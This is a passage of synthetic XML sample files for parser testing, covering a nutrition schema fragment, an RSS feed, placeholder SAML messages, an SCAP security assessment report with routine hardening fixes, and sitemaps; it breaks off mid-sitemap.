      <element name="fat">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="saturatedFat">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="cholesterol">
        <attribute name="unit">
          <value>mg</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="sodium">
        <attribute name="unit">
          <value>mg</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="carbohydrates">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="fiber">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="sugar">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="protein">
        <attribute name="unit">
          <value>g</value>
        </attribute>
        <data type="decimal"/>
      </element>
    </optional>
    
    <optional>
      <element name="vitamins">
        <oneOrMore>
          <element name="vitamin">
            <attribute name="name">
              <text/>
            </attribute>
            <attribute name="amount">
              <data type="decimal"/>
            </attribute>
            <attribute name="unit">
              <text/>
            </attribute>
            <optional>
              <attribute name="dailyValue">
                <data type="decimal"/>
              </attribute>
            </optional>
          </element>
        </oneOrMore>
      </element>
    </optional>
  </define>

</grammar>
</file>

<file path="sample_data/test_files_synthetic/small/rss/sample-feed.xml">
<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>Sample RSS Feed</title>
    <link>https://example.com</link>
    <description>This is a sample RSS feed for testing XML parsing capabilities</description>
    <lastBuildDate>Wed, 23 Jul 2025 12:00:00 GMT</lastBuildDate>
    <language>en-US</language>
    <atom:link href="https://example.com/feed.xml" rel="self" type="application/rss+xml"/>
    
    <item>
      <title>First News Article</title>
      <link>https://example.com/news/1</link>
      <description>This is the description of the first news article with various RSS features</description>
      <pubDate>Wed, 23 Jul 2025 10:00:00 GMT</pubDate>
      <guid isPermaLink="true">https://example.com/news/1</guid>
      <author>editor@example.com (News Editor)</author>
      <category>Technology</category>
      <media:thumbnail url="https://example.com/images/thumbnail1.jpg"/>
    </item>
    
    <item>
      <title>Second News Article</title>
      <link>https://example.com/news/2</link>
      <description>This is the description of the second news article demonstrating RSS structure</description>
      <pubDate>Wed, 23 Jul 2025 08:00:00 GMT</pubDate>
      <guid isPermaLink="true">https://example.com/news/2</guid>
      <author>reporter@example.com (Field Reporter)</author>
      <category>Business</category>
      <media:thumbnail url="https://example.com/images/thumbnail2.jpg"/>
    </item>
    
    <item>
      <title>Third News Article</title>
      <link>https://example.com/news/3</link>
      <description>This article shows additional RSS elements and namespaces</description>
      <pubDate>Wed, 23 Jul 2025 06:00:00 GMT</pubDate>
      <guid isPermaLink="true">https://example.com/news/3</guid>
      <author>writer@example.com (Content Writer)</author>
      <category>Science</category>
      <media:thumbnail url="https://example.com/images/thumbnail3.jpg"/>
    </item>
  </channel>
</rss>
</file>

<file path="sample_data/test_files_synthetic/small/saml/saml_assertion.xml">
<?xml version="1.0" encoding="UTF-8"?>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6"
                Version="2.0"
                IssueInstant="2025-01-24T10:30:00Z">
  
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  
  <ds:Signature>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      <ds:Reference URI="#_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <ds:DigestValue>abcdef1234567890</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>base64encodedSignature==</ds:SignatureValue>
    <ds:KeyInfo>
      <ds:X509Data>
        <ds:X509Certificate>base64encodedCertificate==</ds:X509Certificate>
      </ds:X509Data>
    </ds:KeyInfo>
  </ds:Signature>
  
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">john.doe@example.com</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="2025-01-24T10:35:00Z"
                                    Recipient="https://sp.example.com/acs"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  
  <saml:Conditions NotBefore="2025-01-24T10:25:00Z" NotOnOrAfter="2025-01-24T10:35:00Z">
    <saml:AudienceRestriction>
      <saml:Audience>https://sp.example.com</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  
  <saml:AuthnStatement AuthnInstant="2025-01-24T10:30:00Z" SessionIndex="_be9967abd904ddcae3c0eb4189adbe3f71e327cf93">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </saml:AuthnContext>
    <saml:SubjectLocality Address="192.168.1.100" DNSName="client.example.com"/>
  </saml:AuthnStatement>
  
  <saml:AttributeStatement>
    <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name" 
                    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
      <saml:AttributeValue>John Doe</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"
                    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
      <saml:AttributeValue>john.doe@example.com</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="Role" 
                    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"
                    FriendlyName="User Role">
      <saml:AttributeValue>Manager</saml:AttributeValue>
      <saml:AttributeValue>User</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
  
</saml:Assertion>
</file>

<file path="sample_data/test_files_synthetic/small/saml/saml_authn_request.xml">
<?xml version="1.0" encoding="UTF-8"?>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="_429add22-143a-11e0-ac29-744553540000"
                    Version="2.0"
                    IssueInstant="2025-01-24T10:28:00Z"
                    Destination="https://idp.example.com/sso"
                    ForceAuthn="false"
                    IsPassive="false"
                    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                    AssertionConsumerServiceURL="https://sp.example.com/acs">
  
  <saml:Issuer>https://sp.example.com</saml:Issuer>
  
  <samlp:NameIDPolicy Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient"
                      AllowCreate="true"/>
  
  <samlp:RequestedAuthnContext Comparison="exact">
    <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
  </samlp:RequestedAuthnContext>
  
</samlp:AuthnRequest>
</file>

<file path="sample_data/test_files_synthetic/small/saml/saml_logout_request.xml">
<?xml version="1.0" encoding="UTF-8"?>
<samlp:LogoutRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                     xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                     ID="_logout123456789"
                     Version="2.0"
                     IssueInstant="2025-01-24T11:00:00Z"
                     Destination="https://idp.example.com/slo"
                     Reason="urn:oasis:names:tc:SAML:2.0:logout:user">
  
  <saml:Issuer>https://sp.example.com</saml:Issuer>
  
  <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">john.doe@example.com</saml:NameID>
  
  <samlp:SessionIndex>_be9967abd904ddcae3c0eb4189adbe3f71e327cf93</samlp:SessionIndex>
  
</samlp:LogoutRequest>
</file>

<file path="sample_data/test_files_synthetic/small/saml/saml_response.xml">
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e7"
                Version="2.0"
                IssueInstant="2025-01-24T10:30:00Z"
                Destination="https://sp.example.com/acs"
                InResponseTo="_429add22-143a-11e0-ac29-744553540000">
  
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  
  <saml:Assertion ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e8"
                  Version="2.0"
                  IssueInstant="2025-01-24T10:30:00Z">
    
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    
    <ds:Signature>
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e8">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>abcdef1234567890abcdef==</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>base64encodedSignatureValue==</ds:SignatureValue>
      <ds:KeyInfo>
        <ds:X509Data>
          <ds:X509Certificate>base64encodedCertificateData==</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </ds:Signature>
    
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2025-01-24T10:35:00Z"
                                      Recipient="https://sp.example.com/acs"
                                      InResponseTo="_429add22-143a-11e0-ac29-744553540000"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    
    <saml:Conditions NotBefore="2025-01-24T10:25:00Z" NotOnOrAfter="2025-01-24T10:35:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>https://sp.example.com</saml:Audience>
        <saml:Audience>https://partner.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    
    <saml:AttributeStatement>
      <saml:Attribute Name="firstName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>Jane</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="lastName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>Smith</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="department" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>Engineering</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    
  </saml:Assertion>
  
</samlp:Response>
</file>

<file path="sample_data/test_files_synthetic/small/scap/security-assessment-report.xml">
<?xml version="1.0" encoding="UTF-8"?>
<arf:asset-report-collection xmlns:arf="http://scap.nist.gov/schema/asset-reporting-format/1.1"
                             xmlns:core="http://scap.nist.gov/schema/reporting-core/1.1"
                             xmlns:ai="http://scap.nist.gov/schema/asset-identification/1.1"
                             xmlns:xccdf="http://checklists.nist.gov/xccdf/1.2"
                             xmlns:oval="http://oval.mitre.org/XMLSchema/oval-results-5"
                             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                             xsi:schemaLocation="http://scap.nist.gov/schema/asset-reporting-format/1.1 asset-reporting-format_1.1.0.xsd">

  <core:relationships>
    <core:relationship type="arfVocabularyRelationship" subject="collection">
      <core:ref>scap_content</core:ref>
    </core:relationship>
    <core:relationship type="createdBy" subject="collection">
      <core:ref>report_provider</core:ref>
    </core:relationship>
  </core:relationships>

  <arf:reports>
    <!-- XCCDF Test Result Report -->
    <arf:report id="xccdf-report">
      <arf:content>
        <xccdf:TestResult xmlns:xccdf="http://checklists.nist.gov/xccdf/1.2" 
                          id="xccdf_sample.scanner_testresult_sample-baseline"
                          start-time="2025-07-23T10:00:00"
                          end-time="2025-07-23T10:45:00"
                          test-system="Sample Security Scanner v2.1"
                          version="1.2">
          
          <xccdf:benchmark href="#scap_sample_benchmark" id="sample-security-baseline"/>
          
          <xccdf:title>SCAP Security Assessment Results</xccdf:title>
          
          <xccdf:identity authenticated="true" privileged="false">scanner-service</xccdf:identity>
          
          <xccdf:target>server01.example.com</xccdf:target>
          <xccdf:target-address>192.168.1.10</xccdf:target-address>
          <xccdf:target-facts>
            <xccdf:fact name="urn:scap:fact:asset:identifier:hostname" type="string">server01.example.com</xccdf:fact>
            <xccdf:fact name="urn:scap:fact:asset:identifier:ipv4" type="string">192.168.1.10</xccdf:fact>
            <xccdf:fact name="urn:scap:fact:asset:environmental_information:operating_system" type="string">Red Hat Enterprise Linux Server 8.4</xccdf:fact>
            <xccdf:fact name="urn:scap:fact:asset:environmental_information:kernel_version" type="string">4.18.0-305.el8.x86_64</xccdf:fact>
            <xccdf:fact name="urn:scap:fact:asset:environmental_information:architecture" type="string">x86_64</xccdf:fact>
          </xccdf:target-facts>
          
          <xccdf:platform idref="cpe:/o:redhat:enterprise_linux:8"/>
          
          <!-- Rule Results -->
          <xccdf:rule-result idref="xccdf_sample_rule_account_disable_post_pw_expiration" time="2025-07-23T10:05:00" severity="medium" weight="10.0">
            <xccdf:result>pass</xccdf:result>
            <xccdf:instance context="undefined">1</xccdf:instance>
            <xccdf:ident system="http://cce.mitre.org">CCE-80954-8</xccdf:ident>
            <xccdf:fix system="urn:xccdf:fix:script:sh">
              useradd -D -f 35
            </xccdf:fix>
            <xccdf:check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
              <xccdf:check-content-ref href="#oval_sample_def_account_disable_post_pw_expiration" name="oval:sample:def:1001"/>
            </xccdf:check>
            <xccdf:message severity="info">Account lockout after password expiration is properly configured</xccdf:message>
          </xccdf:rule-result>
          
          <xccdf:rule-result idref="xccdf_sample_rule_accounts_password_minlen_login_defs" time="2025-07-23T10:07:30" severity="medium" weight="10.0">
            <xccdf:result>fail</xccdf:result>
            <xccdf:instance context="undefined">1</xccdf:instance>
            <xccdf:ident system="http://cce.mitre.org">CCE-80652-8</xccdf:ident>
            <xccdf:fix system="urn:xccdf:fix:script:sh">
              sed -i 's/^PASS_MIN_LEN.*/PASS_MIN_LEN\t8/' /etc/login.defs
            </xccdf:fix>
            <xccdf:check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
              <xccdf:check-content-ref href="#oval_sample_def_password_minlen" name="oval:sample:def:1002"/>
            </xccdf:check>
            <xccdf:message severity="error">Minimum password length is set to 6, should be at least 8</xccdf:message>
          </xccdf:rule-result>
          
          <xccdf:rule-result idref="xccdf_sample_rule_service_sshd_enabled" time="2025-07-23T10:10:15" severity="high" weight="10.0">
            <xccdf:result>pass</xccdf:result>
            <xccdf:instance context="undefined">1</xccdf:instance>
            <xccdf:ident system="http://cce.mitre.org">CCE-80775-7</xccdf:ident>
            <xccdf:check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
              <xccdf:check-content-ref href="#oval_sample_def_service_sshd_enabled" name="oval:sample:def:1003"/>
            </xccdf:check>
            <xccdf:message severity="info">SSH service is enabled and running</xccdf:message>
          </xccdf:rule-result>
          
          <xccdf:rule-result idref="xccdf_sample_rule_file_permissions_etc_passwd" time="2025-07-23T10:12:45" severity="high" weight="10.0">
            <xccdf:result>notapplicable</xccdf:result>
            <xccdf:instance context="undefined">1</xccdf:instance>
            <xccdf:ident system="http://cce.mitre.org">CCE-26887-8</xccdf:ident>
            <xccdf:check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
              <xccdf:check-content-ref href="#oval_sample_def_file_permissions_etc_passwd" name="oval:sample:def:1004"/>
            </xccdf:check>
            <xccdf:message severity="info">Rule not applicable to this system configuration</xccdf:message>
          </xccdf:rule-result>
          
          <xccdf:rule-result idref="xccdf_sample_rule_firewall_enabled" time="2025-07-23T10:15:20" severity="high" weight="10.0">
            <xccdf:result>unknown</xccdf:result>
            <xccdf:instance context="undefined">1</xccdf:instance>
            <xccdf:ident system="http://cce.mitre.org">CCE-80990-2</xccdf:ident>
            <xccdf:check system="http://oval.mitre.org/XMLSchema/oval-definitions-5">
              <xccdf:check-content-ref href="#oval_sample_def_firewall_enabled" name="oval:sample:def:1005"/>
            </xccdf:check>
            <xccdf:message severity="warning">Could not determine firewall status - manual verification required</xccdf:message>
          </xccdf:rule-result>
          
          <!-- Score Information -->
          <xccdf:score system="urn:xccdf:scoring:default" maximum="100.0">75.0</xccdf:score>
          <xccdf:score system="urn:xccdf:scoring:flat" maximum="5.0">3.0</xccdf:score>
          
        </xccdf:TestResult>
      </arf:content>
    </arf:report>

    <!-- OVAL Results Report -->
    <arf:report id="oval-report">
      <arf:content>
        <oval:oval_results xmlns:oval="http://oval.mitre.org/XMLSchema/oval-results-5"
                          xmlns:oval-def="http://oval.mitre.org/XMLSchema/oval-definitions-5"
                          xmlns:oval-sys="http://oval.mitre.org/XMLSchema/oval-system-characteristics-5"
                          xmlns:oval-res="http://oval.mitre.org/XMLSchema/oval-results-5">
          
          <oval:generator>
            <oval:product_name>Sample OVAL Scanner</oval:product_name>
            <oval:product_version>2.1.0</oval:product_version>
            <oval:schema_version>5.11.1</oval:schema_version>
            <oval:timestamp>2025-07-23T10:45:00</oval:timestamp>
          </oval:generator>
          
          <oval:definitions>
            <oval-def:definition class="compliance" id="oval:sample:def:1002" version="1">
              <oval-def:metadata>
                <oval-def:title>Password minimum length check</oval-def:title>
                <oval-def:description>Verify that minimum password length is set appropriately</oval-def:description>
              </oval-def:metadata>
              <oval-def:criteria>
                <oval-def:criterion test_ref="oval:sample:tst:1002"/>
              </oval-def:criteria>
            </oval-def:definition>
          </oval:definitions>
          
          <oval:tests>
            <oval-sys:textfilecontent54_test xmlns="http://oval.mitre.org/XMLSchema/oval-definitions-5#independent"
                                           id="oval:sample:tst:1002" version="1"
                                           check_existence="all_exist" check="all">
              <oval-sys:object object_ref="oval:sample:obj:1002"/>
              <oval-sys:state state_ref="oval:sample:ste:1002"/>
            </oval-sys:textfilecontent54_test>
          </oval:tests>
          
          <oval:objects>
            <oval-sys:textfilecontent54_object xmlns="http://oval.mitre.org/XMLSchema/oval-definitions-5#independent"
                                              id="oval:sample:obj:1002" version="1">
              <oval-sys:filepath>/etc/login.defs</oval-sys:filepath>
              <oval-sys:pattern operation="pattern match">^PASS_MIN_LEN\s+(\d+)</oval-sys:pattern>
              <oval-sys:instance datatype="int">1</oval-sys:instance>
            </oval-sys:textfilecontent54_object>
          </oval:objects>
          
          <oval:states>
            <oval-sys:textfilecontent54_state xmlns="http://oval.mitre.org/XMLSchema/oval-definitions-5#independent"
                                             id="oval:sample:ste:1002" version="1">
              <oval-sys:subexpression datatype="int" operation="greater than or equal">8</oval-sys:subexpression>
            </oval-sys:textfilecontent54_state>
          </oval:states>
          
          <oval:system_characteristics>
            <oval:generator>
              <oval:product_name>Sample OVAL Scanner</oval:product_name>
              <oval:product_version>2.1.0</oval:product_version>
              <oval:schema_version>5.11.1</oval:schema_version>
              <oval:timestamp>2025-07-23T10:45:00</oval:timestamp>
            </oval:generator>
            
            <oval:system_info>
              <oval:os_name>Red Hat Enterprise Linux Server</oval:os_name>
              <oval:os_version>8.4</oval:os_version>
              <oval:architecture>x86_64</oval:architecture>
              <oval:primary_host_name>server01.example.com</oval:primary_host_name>
              <oval:interfaces>
                <oval:interface>
                  <oval:interface_name>eth0</oval:interface_name>
                  <oval:ip_address>192.168.1.10</oval:ip_address>
                  <oval:mac_address>00:50:56:a1:b2:c3</oval:mac_address>
                </oval:interface>
              </oval:interfaces>
            </oval:system_info>
            
            <oval:collected_objects>
              <oval:object id="oval:sample:obj:1002" version="1" flag="complete"/>
            </oval:collected_objects>
            
            <oval:system_data>
              <oval-sys:textfilecontent_item xmlns="http://oval.mitre.org/XMLSchema/oval-system-characteristics-5#independent"
                                           id="1" status="exists">
                <oval-sys:filepath>/etc/login.defs</oval-sys:filepath>
                <oval-sys:pattern>^PASS_MIN_LEN\s+(\d+)</oval-sys:pattern>
                <oval-sys:instance datatype="int">1</oval-sys:instance>
                <oval-sys:text>PASS_MIN_LEN		6</oval-sys:text>
                <oval-sys:subexpression datatype="int">6</oval-sys:subexpression>
              </oval-sys:textfilecontent_item>
            </oval:system_data>
          </oval:system_characteristics>
          
          <oval:results>
            <oval:system system_ref="server01.example.com">
              <oval:definitions>
                <oval:definition definition_id="oval:sample:def:1002" version="1" class="compliance" result="false"/>
              </oval:definitions>
              
              <oval:tests>
                <oval:test test_id="oval:sample:tst:1002" version="1" check_existence="all_exist" check="all" result="false"/>
              </oval:tests>
              
              <oval:collected_objects>
                <oval:object object_id="oval:sample:obj:1002" version="1" flag="complete"/>
              </oval:collected_objects>
              
              <oval:system_data>
                <oval:system_data_ref item_ref="1"/>
              </oval:system_data>
            </oval:system>
          </oval:results>
          
        </oval:oval_results>
      </arf:content>
    </arf:report>
  </arf:reports>

  <!-- Remote Resources -->
  <arf:remote-resources>
    <arf:resource id="scap_content">
      <core:title>Sample Security Baseline Content</core:title>
      <core:description>SCAP content package for baseline security assessment</core:description>
      <arf:resource-locator>https://example.com/scap/sample-baseline-content.xml</arf:resource-locator>
    </arf:resource>
    
    <arf:resource id="report_provider">
      <core:title>Sample Security Scanner</core:title>
      <core:description>Automated security assessment tool</core:description>
      <arf:resource-locator>https://example.com/scanner</arf:resource-locator>
    </arf:resource>
  </arf:remote-resources>

  <!-- Asset Information -->
  <arf:assets>
    <arf:asset id="asset-server01">
      <ai:computing-device>
        <ai:hostname>server01.example.com</ai:hostname>
        <ai:fqdn>server01.example.com</ai:fqdn>
        <ai:connections>
          <ai:connection>
            <ai:ip-address>
              <ai:ip-v4>192.168.1.10</ai:ip-v4>
            </ai:ip-address>
            <ai:mac-address>00:50:56:a1:b2:c3</ai:mac-address>
            <ai:subnet>
              <ai:ip-netmask>255.255.255.0</ai:ip-netmask>
            </ai:subnet>
          </ai:connection>
        </ai:connections>
        <ai:motherboard>
          <ai:bios>
            <ai:bios-vendor>Phoenix Technologies Ltd.</ai:bios-vendor>
            <ai:bios-version>6.00</ai:bios-version>
            <ai:bios-release-date>2020-04-15</ai:bios-release-date>
          </ai:bios>
          <ai:processor>
            <ai:cpu-model>Intel(R) Xeon(R) CPU E5-2690 v4</ai:cpu-model>
            <ai:cpu-speed unit="MHz">2600</ai:cpu-speed>
            <ai:cpu-count>2</ai:cpu-count>
          </ai:processor>
        </ai:motherboard>
        <ai:memory>
          <ai:memory-size unit="GB">16</ai:memory-size>
        </ai:memory>
      </ai:computing-device>
    </arf:asset>
  </arf:assets>

</arf:asset-report-collection>
</file>

<file path="sample_data/test_files_synthetic/small/sitemap/minimal.xml">
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://minimal-site.com/</loc>
  </url>
  <url>
    <loc>https://minimal-site.com/page1</loc>
  </url>
  <url>
    <loc>https://minimal-site.com/page2</loc>
  </url>
</urlset>
</file>

<file path="sample_data/test_files_synthetic/small/sitemap/sitemap-example.xml">
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
        xmlns:image="http://www.google.com/schemas/sitemap-image/1.1"
        xmlns:video="http://www.google.com/schemas/sitemap-video/1.1"
        xmlns:xhtml="http://www.w3.org/1999/xhtml">
  
  <!-- Homepage -->
  <url>
    <loc>https://www.example.com/</loc>
    <lastmod>2025-07-23</lastmod>
    <changefreq>weekly</changefreq>
    <priority>1.0</priority>
    <xhtml:link rel="alternate" hreflang="en" href="https://www.example.com/"/>
    <xhtml:link rel="alternate" hreflang="es" href="https://www.example.com/es/"/>
    <xhtml:link rel="alternate" hreflang="fr" href="https://www.example.com/fr/"/>
  </url>
  
  <!-- About Page -->
  <url>
    <loc>https://www.example.com/about</loc>
    <lastmod>2025-07-20</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.8</priority>
    <xhtml:link rel="alternate" hreflang="en" href="https://www.example.com/about"/>
    <xhtml:link rel="alternate" hreflang="es" href="https://www.example.com/es/about"/>
    <xhtml:link rel="alternate" hreflang="fr" href="https://www.example.com/fr/about"/>
  </url>
  
  <!-- Products Page with Images -->
  <url>
    <loc>https://www.example.com/products</loc>
    <lastmod>2025-07-22</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.9</priority>
    <image:image>
      <image:loc>https://www.example.com/images/product-hero.jpg</image:loc>
      <image:title>Featured Products</image:title>
      <image:caption>Our latest collection of products</image:caption>
    </image:image>
    <image:image>
      <image:loc>https://www.example.com/images/product-gallery.jpg</image:loc>
      <image:title>Product Gallery</image:title>
      <image:caption>Browse our complete product range</image:caption>
    </image:image>
  </url>
  
  <!-- Blog with Video Content -->
  <url>
    <loc>https://www.example.com/blog/video-tutorial</loc>
    <lastmod>2025-07-21</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.7</priority>
    <video:video>
      <video:thumbnail_loc>https://www.example.com/images/video-thumb.jpg</video:thumbnail_loc>
      <video:title>How to Use Our Product - Tutorial</video:title>
      <video:description>A comprehensive tutorial showing how to get the most out of our product</video:description>
      <video:content_loc>https://www.example.com/videos/tutorial.mp4</video:content_loc>
      <video:duration>300</video:duration>
      <video:publication_date>2025-07-21</video:publication_date>
      <video:family_friendly>yes</video:family_friendly>
    </video:video>
  </url>
  
  <!-- Contact Page -->
  <url>
    <loc>https://www.example.com/contact</loc>
    <lastmod>2025-07-15</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.6</priority>
  </url>
  
  <!-- FAQ Page -->
  <url>
    <loc>https://www.example.com/faq</loc>
    <lastmod>2025-07-18</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.5</priority>
  </url>
  
  <!-- Blog Index -->
  <url>
    <loc>https://www.example.com/blog</loc>
    <lastmod>2025-07-23</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.8</priority>
  </url>
  
  <!-- Individual Blog Posts -->
  <url>
    <loc>https://www.example.com/blog/getting-started-guide</loc>
    <lastmod>2025-07-19</lastmod>
    <changefreq>yearly</changefreq>
    <priority>0.6</priority>
  </url>
  
  <url>
    <loc>https://www.example.com/blog/advanced-features</loc>
    <lastmod>2025-07-17</lastmod>
    <changefreq>yearly</changefreq>
    <priority>0.6</priority>
  </url>
  
  <!-- Privacy Policy -->
  <url>
    <loc>https://www.example.com/privacy</loc>
    <lastmod>2025-07-01</lastmod>
    <changefreq>yearly</changefreq>
    <priority>0.3</priority>
  </url>
  
  <!-- Terms of Service -->
  <url>
    <loc>https://www.example.com/terms</loc>
    <lastmod>2025-07-01</lastmod>
    <changefreq>yearly</changefreq>
    <priority>0.3</priority>
  </url>

</urlset>
</file>

<file path="sample_data/test_files_synthetic/small/sitemap/sitemapindex.xml">
<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <sitemap>
    <loc>https://example.com/sitemap-main.xml</loc>
    <lastmod>2024-01-15T10:30:00Z</lastmod>
  </sitemap>
  <sitemap>
    <loc>https://example.com/sitemap-products.xml</loc>
    <lastmod>2024-01-14T15:45:00Z</lastmod>
  </sitemap>
  <sitemap>
    <loc>https://example.com/sitemap-blog.xml</loc>
    <lastmod>2024-01-15T08:20:00Z</lastmod>
  </sitemap>
  <sitemap>
    <loc>https://example.com/sitemap-news.xml</loc>
    <lastmod>2024-01-15T12:15:00Z</lastmod>
  </sitemap>
</sitemapindex>
</file>

<file path="sample_data/test_files_synthetic/small/sitemap/urlset.xml">
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://example.com/</loc>
    <lastmod>2024-01-15</lastmod>
    <changefreq>daily</changefreq>
    <priority>1.0</priority>
  </url>
  <url>
    <loc>https://example.com/about</loc>
    <lastmod>2024-01-10</lastmod>
    <changefreq>monthly</changefreq>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>https://example.com/products</loc>
    <lastmod>2024-01-12</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.9</priority>
  </url>
  <url>
    <loc>https://example.com/products/laptop</loc>
    <lastmod>2024-01-14</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.7</priority>
  </url>
  <url>
    <loc>https://example.com/products/desktop</loc>
    <lastmod>2024-01-13</lastmod>
    <changefreq>weekly</changefreq>
    <priority>0.7</priority>
  </url>
  <url>
    <loc>https://example.com/blog</loc>
    <lastmod>2024-01-15</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.8</priority>
  </url>
  <url>
    <loc>https://example.com/blog/seo-tips</loc>
    <lastmod>2024-01-14</lastmod>
